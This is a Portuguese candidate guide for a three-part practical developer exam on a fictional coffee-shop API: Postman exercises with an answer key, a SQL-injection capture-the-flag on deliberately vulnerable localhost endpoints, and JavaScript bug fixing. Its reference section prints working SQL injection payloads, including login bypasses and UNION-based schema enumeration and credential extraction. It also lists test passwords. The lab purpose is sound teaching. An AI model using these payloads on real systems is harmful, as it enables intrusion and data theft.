# 🎯 Guia do Candidato

> Prova Prática de Desenvolvimento - Grão & Código

---

## 👋 Bem-vindo!

Parabéns por chegar até aqui! Esta prova prática foi desenvolvida para avaliar suas habilidades técnicas de forma justa e realista.

Você trabalhará com uma API de uma cafeteria fictícia chamada **"Grão & Código"**. A prova é dividida em 3 partes e você terá aproximadamente **3 horas** para completá-la.

**Relaxe, leia com atenção e boa prova!** ☕

---

## 📋 Estrutura da Prova

| Parte | O que fazer | Tempo |
|-------|-------------|-------|
| **1** | Explorar a API com Postman | 30-45 min |
| **2** | Encontrar vulnerabilidades (CTF) | 60-90 min |
| **3** | Corrigir bugs no código | 45-60 min |

---

## ✅ O que PODE fazer

- ✅ Consultar **TODA** a documentação deste guia (inclui referência técnica)
- ✅ Usar qualquer ferramenta já instalada (Postman, VS Code)
- ✅ Fazer anotações
- ✅ Perguntar ao examinador sobre o **enunciado**

## ❌ O que NÃO pode fazer

- ❌ **Pesquisar na internet**
- ❌ Comunicar-se com outras pessoas
- ❌ Usar IA generativa (ChatGPT, Claude, Copilot, etc.)
- ❌ Copiar respostas de outros candidatos
- ❌ Acessar materiais pessoais (celular, etc.)

> **⚠️ IMPORTANTE:** Toda a referência técnica que você precisa está neste documento!

---

## 🚀 Começando

### 1. Verifique se a API está rodando

Abra o navegador e acesse:
```
http://localhost:3000
```

Você deve ver uma mensagem de boas-vindas com os endpoints disponíveis.

### 2. Abra o Postman

O Postman já deve estar instalado na sua máquina. Se houver uma Collection do projeto, importe-a:
- File → Import → Selecione o arquivo `postman/Grao_e_Codigo_API.postman_collection.json`

### 3. Explore a documentação da API

Acesse:
```
http://localhost:3000/api/docs
```

---

# 📝 PARTE 1: Exploração com Postman

**Tempo sugerido: 30-45 minutos**

## Objetivo
Familiarizar-se com a API testando os endpoints disponíveis.

## O que fazer

### 1. Teste os endpoints de listagem (GET)

```
GET http://localhost:3000/api/products
GET http://localhost:3000/api/categories
GET http://localhost:3000/api/orders
GET http://localhost:3000/api/users
```

### 2. Use filtros (query params) - 🎯 EXERCÍCIO

> **📝 Exercício:** Complete as URLs abaixo com os parâmetros de query corretos.
> Use o Postman para testar suas respostas!

**Sintaxe de Query Params:**
```
GET http://localhost:3000/api/recurso?parametro=valor&outroParametro=valor2
```

---

#### 🔹 Exercício 2.1 - Filtrar Produtos por Categoria
**Objetivo:** Buscar todos os produtos da categoria de ID `1`
```
GET http://localhost:3000/api/products?____________
```
<details>
<summary>💡 Dica</summary>
O parâmetro se chama <code>category</code> e recebe o ID da categoria.
</details>

---

#### 🔹 Exercício 2.2 - Filtrar Produtos por Faixa de Preço
**Objetivo:** Buscar produtos entre R$ 10,00 e R$ 50,00
```
GET http://localhost:3000/api/products?____________&____________
```
<details>
<summary>💡 Dica</summary>
Use os parâmetros <code>minPrice</code> e <code>maxPrice</code>.
</details>

---

#### 🔹 Exercício 2.3 - Filtrar Produtos Ativos
**Objetivo:** Buscar apenas produtos que estão ativos
```
GET http://localhost:3000/api/products?____________
```
<details>
<summary>💡 Dica</summary>
O parâmetro se chama <code>active</code> e aceita valores booleanos.
</details>

---

#### 🔹 Exercício 2.4 - Filtrar Usuários por Cargo
**Objetivo:** Buscar todos os usuários com cargo de "barista"
```
GET http://localhost:3000/api/users?____________
```
<details>
<summary>💡 Dica</summary>
O parâmetro se chama <code>role</code>.
</details>

---

#### 🔹 Exercício 2.5 - Filtrar Pedidos por Status
**Objetivo:** Buscar pedidos que já foram entregues
```
GET http://localhost:3000/api/orders?____________
```
<details>
<summary>💡 Dica</summary>
O parâmetro se chama <code>status</code>. Status possíveis: pending, preparing, ready, delivered, cancelled.
</details>

---

#### 🔹 Exercício 2.6 - Combinando Filtros (Desafio)
**Objetivo:** Buscar produtos da categoria `2` que custam no máximo R$ 20,00
```
GET http://localhost:3000/api/products?____________&____________
```

---

<details>
<summary>✅ Ver Gabarito Completo</summary>

```
# 2.1 - Filtrar por categoria
GET http://localhost:3000/api/products?category=1

# 2.2 - Filtrar por faixa de preço
GET http://localhost:3000/api/products?minPrice=10&maxPrice=50

# 2.3 - Filtrar produtos ativos
GET http://localhost:3000/api/products?active=true

# 2.4 - Filtrar por cargo
GET http://localhost:3000/api/users?role=barista

# 2.5 - Filtrar por status
GET http://localhost:3000/api/orders?status=delivered

# 2.6 - Combinando filtros
GET http://localhost:3000/api/products?category=2&maxPrice=20
```
</details>

### 3. Busque itens específicos

```
GET http://localhost:3000/api/products/1
GET http://localhost:3000/api/orders/1
GET http://localhost:3000/api/categories/1
GET http://localhost:3000/api/users/3
```

### 4. Faça login

```
POST http://localhost:3000/api/auth/login
Content-Type: application/json

{
    "username": "barista_joao",
    "password": "cafezinho"
}
```

**Outros usuários para testar:**
| Username | Senha |
|----------|-------|
| admin | admin123 |
| gerente_maria | maria2024! |
| barista_ana | latte123 |
| cliente_carlos | carlos99 |

### 5. Crie um pedido

```
POST http://localhost:3000/api/orders
Content-Type: application/json

{
    "user_id": 5,
    "items": [
        { "product_id": 1, "quantity": 2 },
        { "product_id": 3, "quantity": 1 }
    ],
    "notes": "Sem açúcar"
}
```

### 6. Atualize o status de um pedido

```
PATCH http://localhost:3000/api/orders/1/status
Content-Type: application/json

{
    "status": "preparing"
}
```

**Status válidos:** `pending`, `confirmed`, `preparing`, `ready`, `delivered`, `cancelled`

## Entrega
- Mantenha sua Collection do Postman organizada
- O examinador verificará suas requisições ao final

---

# 🚩 PARTE 2: CTF - Capture The Flag

**Tempo sugerido: 60-90 minutos**

## Objetivo
Encontrar **flags** (códigos secretos) escondidas no banco de dados usando técnicas de **SQL Injection**.

## O que são Flags?
São códigos secretos no formato:
```
Flag{texto_aqui}
```

Exemplo: `Flag{W3lc0m3_t0_SQL_W0rld}`

Existem **10 flags** escondidas, totalizando **520 pontos**.

## Endpoints Vulneráveis

| Endpoint | Pontos disponíveis |
|----------|-------------------|
| `GET /api/vulnerable/search?q=` | 10-50 pts |
| `POST /api/vulnerable/login` | 50-100 pts |
| `GET /api/vulnerable/product/:id` | 50 pts |
| `GET /api/vulnerable/users?role=` | 25-75 pts |
| `GET /api/vulnerable/promo?code=` | 30 pts |
| `GET /api/vulnerable/notes?priority=` | 80 pts |
| `GET /api/vulnerable/tables` | 60 pts |

## Acesse primeiro:
```
GET http://localhost:3000/api/vulnerable/flags
```
Isso mostra dicas para cada flag!

## Lista de Flags

| # | Pontos | Dica |
|---|--------|------|
| 1 | 10 | Tabela secret_flags - use UNION SELECT |
| 2 | 25 | Um usuário desativado tem segredos na senha |
| 3 | 30 | Existe um código promocional secreto |
| 4 | 40 | Há um produto muito caro com um segredo |
| 5 | 50 | UNION SELECT avançado na tabela de flags |
| 6 | 50 | Nem toda conta "root" é real... |
| 7 | 60 | Explore a estrutura do banco |
| 8 | 75 | O CTO deixou algo nas notas |
| 9 | 80 | Existe uma tabela admin_notes |
| 10 | 100 | Faça login como admin sem a senha |

## Entrega

Anote todas as flags encontradas. O examinador pedirá a lista ao final.

---

# 🐛 PARTE 3: Correção de Bugs

**Tempo sugerido: 45-60 minutos**

## Objetivo
Identificar e corrigir **6 bugs** no arquivo `src/routes/buggy.js`.

## Como funciona

1. Acesse `GET http://localhost:3000/api/buggy` para ver a lista de bugs
2. Teste cada endpoint no Postman
3. Abra o arquivo `src/routes/buggy.js` no VS Code
4. Encontre o bug (procure `/* BUG #X */`)
5. Corrija o código
6. Salve - o hot reload aplica automaticamente
7. Teste novamente

## Lista de Bugs

### Bug #1 - Comparação de Tipos (10 pts)

**Teste:**
```
GET http://localhost:3000/api/buggy/products
```

**Problema:** Produtos com `stock: 0` mostram "Em estoque" ao invés de "Esgotado".

**Localização:** Linha ~35, procure `/* BUG #1 */`

---

### Bug #2 - Cálculo Incorreto (10 pts)

**Teste:**
```
GET http://localhost:3000/api/buggy/total/1
```

**Problema:** O `calculated_total` mostra algo como "07.512.008.50" ao invés de um número.

**Localização:** Linha ~65, procure `/* BUG #2 */`

---

### Bug #3 - Async/Await (10 pts)

**Teste:**
```
POST http://localhost:3000/api/buggy/order
Content-Type: application/json

{
    "user_id": 5,
    "items": [
        { "product_id": 1, "quantity": 2 }
    ]
}
```

Depois verifique: `GET /api/orders/{id_retornado}`

**Problema:** O total é sempre 0 e os itens não são salvos.

**Localização:** Linha ~95, procure `/* BUG #3 */`

---

### Bug #4 - Off-by-One Error (10 pts)

**Teste:**
```
GET http://localhost:3000/api/buggy/ranking
```

**Problema:** O último item do ranking mostra `product: null` ou `undefined`.

**Localização:** Linha ~140, procure `/* BUG #4 */`

---

### Bug #5 - Validação de Entrada (10 pts)

**Teste:**
```
POST http://localhost:3000/api/buggy/discount
Content-Type: application/json

{
    "product_id": 1,
    "discount_percent": -50
}
```

**Problema:** Desconto negativo AUMENTA o preço! Desconto de 150% dá preço negativo!

**Localização:** Linha ~175, procure `/* BUG #5 */`

---

### Bug #6 - Escopo de Variável (10 pts)

**Teste:**
```
GET http://localhost:3000/api/buggy/summary
```

**Problema:** O total de cada categoria está acumulando valores das anteriores.

**Localização:** Linha ~210, procure `/* BUG #6 */`

---

## Entrega

O examinador verificará suas correções no arquivo `src/routes/buggy.js`.

---

# 📚 REFERÊNCIA TÉCNICA

> Use esta seção como consulta durante toda a prova!

---

## 🌐 HTTP - Métodos e Status

### Métodos HTTP

| Método | Uso | Exemplo |
|--------|-----|---------|
| **GET** | Buscar dados | Listar produtos, buscar usuário |
| **POST** | Criar novo recurso | Criar pedido, fazer login |
| **PUT** | Atualizar recurso (completo) | Atualizar produto inteiro |
| **PATCH** | Atualizar parcialmente | Mudar só o status |
| **DELETE** | Remover recurso | Deletar produto |

### Códigos de Status HTTP

| Código | Significado | Quando acontece |
|--------|-------------|-----------------|
| **200** | OK | Requisição bem-sucedida |
| **201** | Created | Recurso criado com sucesso |
| **400** | Bad Request | Dados enviados são inválidos |
| **401** | Unauthorized | Não autenticado |
| **403** | Forbidden | Sem permissão |
| **404** | Not Found | Recurso não existe |
| **500** | Internal Server Error | Erro no servidor |

### Headers Importantes

```
Content-Type: application/json    // Enviando JSON
Authorization: Bearer <token>     // Autenticação
```

---

## 💉 SQL Injection - Referência Completa

### O que é SQL Injection?

É uma técnica onde inserimos código SQL em campos de entrada para manipular consultas ao banco de dados.

### Como funciona

**Query original no código:**
```sql
SELECT * FROM users WHERE username = '[entrada]' AND password = '[entrada]'
```

**Se você digitar:** `admin' --`

**A query fica:**
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

O `--` comenta o resto, ignorando a verificação de senha!

### Testando Vulnerabilidade

Coloque uma aspas simples `'` em qualquer campo:
```
GET /api/vulnerable/search?q='
```

Se aparecer erro SQL, é vulnerável!

### Payloads Básicos

#### Para bypass de login:
```
admin' --
admin' #
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 --
```

#### Para ver todos os registros:
```
' OR '1'='1
' OR 1=1 --
' OR 'a'='a
```

#### Comentários SQL:
```
--          (MySQL, PostgreSQL, SQL Server)
#           (MySQL)
/* */       (Todos)
```

### UNION SELECT

O UNION combina resultados de duas queries. **Regras:**
1. Ambas as queries devem ter o **mesmo número de colunas**
2. Os tipos de dados devem ser compatíveis

#### Descobrindo número de colunas:

**Método 1 - ORDER BY:**
```
' ORDER BY 1 --     ✓ funciona
' ORDER BY 2 --     ✓ funciona
' ORDER BY 3 --     ✓ funciona
' ORDER BY 4 --     ✗ erro!
```
Conclusão: 3 colunas.

**Método 2 - UNION SELECT NULL:**
```
' UNION SELECT NULL --                    ✗ erro
' UNION SELECT NULL, NULL --              ✗ erro
' UNION SELECT NULL, NULL, NULL --        ✓ funciona!
```

#### Extraindo dados:

```sql
-- Ver tabelas do banco
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='grao_codigo' --

-- Ver colunas de uma tabela
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- Extrair dados
' UNION SELECT username, password, email FROM users --
```

### Tabelas Úteis (information_schema)

| Tabela | Conteúdo |
|--------|----------|
| `information_schema.tables` | Lista de todas as tabelas |
| `information_schema.columns` | Lista de todas as colunas |
| `information_schema.schemata` | Lista de bancos de dados |

#### Colunas importantes:
- `table_schema` - nome do banco
- `table_name` - nome da tabela
- `column_name` - nome da coluna

### Exemplos Práticos para Esta Prova

#### Busca de produtos vulnerável:
```
# Normal
GET /api/vulnerable/search?q=café

# Ver todos
GET /api/vulnerable/search?q=' OR '1'='1

# UNION com secret_flags (9 colunas)
GET /api/vulnerable/search?q=' UNION SELECT flag_code,flag_name,hint,points,5,6,7,8,9 FROM secret_flags --
```

#### Login vulnerável:
```
POST /api/vulnerable/login

# Bypass como admin
{"username": "admin' --", "password": "qualquer"}

# Bypass genérico
{"username": "' OR '1'='1' --", "password": ""}
```

#### Produto por ID vulnerável:
```
# Normal
GET /api/vulnerable/product/1

# UNION (15 colunas neste endpoint)
GET /api/vulnerable/product/0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM secret_flags --
```

#### Usuários vulnerável:
```
# Ver todos incluindo inativos
GET /api/vulnerable/users?role=' OR '1'='1

# Ver apenas inativos
GET /api/vulnerable/users?role=' OR active=0 --
```

#### Promoções vulnerável:
```
# Ver todas promoções
GET /api/vulnerable/promo?code=' OR '1'='1
```

#### Notas admin vulnerável:
```
# Ver todas notas
GET /api/vulnerable/notes?priority=' OR '1'='1
```

---

## 🟨 JavaScript - Referência para Bugs

### Tipos de Dados

| Tipo | Exemplo | typeof |
|------|---------|--------|
| String | `"hello"`, `'world'` | `"string"` |
| Number | `42`, `3.14` | `"number"` |
| Boolean | `true`, `false` | `"boolean"` |
| Undefined | `undefined` | `"undefined"` |
| Null | `null` | `"object"` |
| Array | `[1, 2, 3]` | `"object"` |
| Object | `{a: 1}` | `"object"` |

### Comparação: == vs ===

```javascript
// == (igualdade com coerção de tipo)
5 == '5'        // true  (converte string para número)
0 == false      // true  (converte false para 0)
null == undefined // true

// === (igualdade estrita - SEM coerção)
5 === '5'       // false (tipos diferentes)
0 === false     // false (tipos diferentes)
null === undefined // false
```

**Regra:** Sempre prefira `===` para evitar bugs!

### Concatenação vs Soma

```javascript
// Com números
let a = 10;
let b = 5;
console.log(a + b);     // 15 (soma)

// String + Número = Concatenação!
let c = '10';
let d = 5;
console.log(c + d);     // '105' (string!)

// Inicialize variáveis numéricas com números!
let total = 0;          // ✓ Correto
let total = '0';        // ✗ Vai concatenar!
```

### Arrays - Índices

```javascript
const arr = ['a', 'b', 'c', 'd'];

arr.length      // 4
arr[0]          // 'a' (primeiro)
arr[1]          // 'b'
arr[2]          // 'c'
arr[3]          // 'd' (último)
arr[4]          // undefined! (não existe)

// Loop correto
for (let i = 0; i < arr.length; i++) {
    console.log(arr[i]);
}

// Erro comum (off-by-one)
for (let i = 0; i <= arr.length; i++) {  // ✗ <= causa erro!
    console.log(arr[i]);  // arr[4] é undefined
}
```

### Async/Await

```javascript
// ✗ ERRADO - forEach NÃO espera async
items.forEach(async (item) => {
    await processItem(item);  // Não espera!
});
console.log('Fim');  // Executa ANTES do forEach terminar!

// ✓ CORRETO - for...of espera cada iteração
for (const item of items) {
    await processItem(item);  // Espera cada um
}
console.log('Fim');  // Executa depois de processar todos

// ✓ CORRETO - Promise.all para paralelo
await Promise.all(items.map(async (item) => {
    await processItem(item);
}));
console.log('Fim');  // Espera todos terminarem
```

### Escopo: var vs let/const

```javascript
// var - escopo de FUNÇÃO (hoisting)
function exemplo() {
    var x = 1;
    if (true) {
        var x = 2;  // Mesma variável!
    }
    console.log(x);  // 2
}

// let/const - escopo de BLOCO
function exemplo() {
    let x = 1;
    if (true) {
        let x = 2;  // Variável DIFERENTE!
    }
    console.log(x);  // 1
}

// Em loops
for (var i = 0; i < 3; i++) { }
console.log(i);  // 3 (var vaza do loop!)

for (let j = 0; j < 3; j++) { }
console.log(j);  // ReferenceError (let não vaza)
```

**Regra:** Use `const` por padrão, `let` quando precisar reatribuir. Evite `var`.

### Validação de Entrada

```javascript
// Sempre valide dados do usuário!

// Verificar se é número
if (typeof value !== 'number' || isNaN(value)) {
    return res.status(400).json({ error: 'Valor deve ser número' });
}

// Verificar range
if (value < 0 || value > 100) {
    return res.status(400).json({ error: 'Valor deve ser entre 0 e 100' });
}

// Verificar se existe
if (!value) {
    return res.status(400).json({ error: 'Valor é obrigatório' });
}

// Verificar tipo de array
if (!Array.isArray(items) || items.length === 0) {
    return res.status(400).json({ error: 'Items deve ser array não vazio' });
}
```

---

## 📮 Postman - Referência Rápida

### Criar Requisição

1. Clique em **+** (nova aba)
2. Selecione o método (GET, POST, etc.)
3. Cole a URL
4. Clique **Send**

### Enviar JSON no Body

1. Selecione método POST/PUT/PATCH
2. Aba **Body**
3. Selecione **raw**
4. Dropdown: **JSON**
5. Digite o JSON

```json
{
    "chave": "valor",
    "numero": 123,
    "array": [1, 2, 3]
}
```

### Query Params

**Opção 1:** Na URL
```
http://localhost:3000/api/products?category=1&active=true
```

**Opção 2:** Aba Params
| Key | Value |
|-----|-------|
| category | 1 |
| active | true |

### Organizar Collection

1. Clique direito na collection
2. **Add Folder**
3. Arraste requisições para dentro

### Atalhos Úteis

| Ação | Atalho |
|------|--------|
| Enviar requisição | Ctrl + Enter |
| Nova requisição | Ctrl + N |
| Salvar | Ctrl + S |
| Duplicar | Ctrl + D |

---

## ⏰ Gestão do Tempo

```
┌─────────────────────────────────────────────────────────────┐
│                    LINHA DO TEMPO SUGERIDA                   │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  00:00 ─────────── PARTE 1: Postman ─────────── 00:45       │
│         │ Explore a API, faça requisições    │              │
│         │ Crie um pedido, teste filtros      │              │
│                                                              │
│  00:45 ─────────── Pausa (10 min) ─────────── 00:55         │
│                                                              │
│  00:55 ─────────── PARTE 2: CTF ───────────── 02:10         │
│         │ Comece pelas flags mais fáceis     │              │
│         │ Use a referência de SQL Injection  │              │
│         │ Anote cada flag encontrada         │              │
│                                                              │
│  02:10 ─────────── Pausa (10 min) ─────────── 02:20         │
│                                                              │
│  02:20 ─────────── PARTE 3: Bugs ───────────── 03:10        │
│         │ Use a referência de JavaScript     │              │
│         │ Teste, encontre, corrija           │              │
│         │ Um bug de cada vez                 │              │
│                                                              │
│  03:10 ─────────── FIM DA PROVA ─────────────               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Dicas de gestão:

- **Não fique preso!** Se travar por mais de 10-15 min, pule para a próxima
- **Use a referência!** Este documento tem tudo que você precisa
- **Comece pelo mais fácil** - ganhe pontos garantidos primeiro
- **Anote suas descobertas** - especialmente as flags

---

## 🆘 Precisa de Ajuda?

### Perguntas permitidas ao examinador:
- "Não entendi o que este endpoint deveria fazer"
- "O Docker parou de funcionar"
- "Não consigo acessar localhost:3000"

### O examinador NÃO vai responder:
- "Como faço SQL Injection?"
- "Qual é a flag desta parte?"
- "Está certo o que eu fiz?"

### Se o ambiente parar de funcionar:
1. Avise o examinador imediatamente
2. Não tente resolver sozinho
3. Seu tempo será pausado

---

## 💪 Você consegue!

Lembre-se:
- É normal não conseguir fazer tudo
- Cada ponto conta
- Use a referência técnica deste documento
- Mostre seu raciocínio

**Boa prova e sucesso!** 🚀

---

*Em caso de dúvidas sobre o enunciado, levante a mão e aguarde o examinador.*
